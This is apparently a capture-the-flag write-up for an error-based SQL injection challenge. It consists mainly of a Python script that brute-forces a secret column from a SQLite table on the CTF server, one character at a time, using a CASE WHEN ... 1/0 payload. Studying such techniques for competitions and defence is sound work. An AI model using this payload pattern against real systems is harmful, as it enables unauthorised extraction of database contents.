# Error - SQL Injection
Super easy SQLi injection. 
The challenge provided the table admin_secrets and column secret_data, so all that was left was
performing an error-based SQLi injection in SQLite.
```
import requests
from urllib.parse import quote

URL = "http://web2.spokane-ctf.com:8084/error"
CHARSET = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}"
print("\"exists\":true")
flag = ""
index = 1
while True:
    found = False
    print("Attempting:")
    for c in CHARSET:
        payload = f"1 and case when (select 1 from admin_secrets where substring(secret_data, 1, {index}) = '{flag}{c}') then 1 else 1/0 end"
        print(payload)
        data = {
            "id": payload   
        }        

        response = requests.get("http://web2.spokane-ctf.com:8084/api/error/check?id=" + quote(payload))

        if "\"exists\":true" in response.text:
            flag += c
            print("\n FLag so far: " + flag)
            found = True
            index+=1
            print("\n")
            break
    if not found:
        print("Complete")
        break

print("Found: " + flag)
```
